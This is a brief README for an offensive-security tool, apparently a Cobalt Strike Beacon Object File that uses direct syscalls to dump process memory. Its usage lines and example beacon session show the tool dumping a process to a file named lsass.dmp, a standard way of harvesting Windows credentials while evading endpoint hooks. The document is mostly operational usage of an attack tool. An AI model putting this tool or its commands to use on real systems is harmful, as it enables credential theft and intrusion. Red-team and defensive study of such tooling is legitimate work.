
## Compile

```
make
```

## Usage

- `static_syscalls_dump PID output_file` - Creates a dump for the specified PID at the supplied location.
- `static_syscalls_dump PID` - Not providing an output location will default to "C:\Windows\Temp\PID-[target_pid].dmp" 

> NOTE: BOF is for 64-bit use only.


### Example Output
```
beacon> static_syscalls_dump 4337 C:\Users\user\Desktop\lsass.dmp
[*] Syscalls Process Dump BOF (@ajpc500)
[+] host called home, sent: 8904 bytes
[+] received output:
Using Syscalls for Windows 10 or Server 2016, build number 19041
Dumping PID 4337 to file: C:\Users\user\Desktop\lsass.dmp

[+] received output:
Success!
```
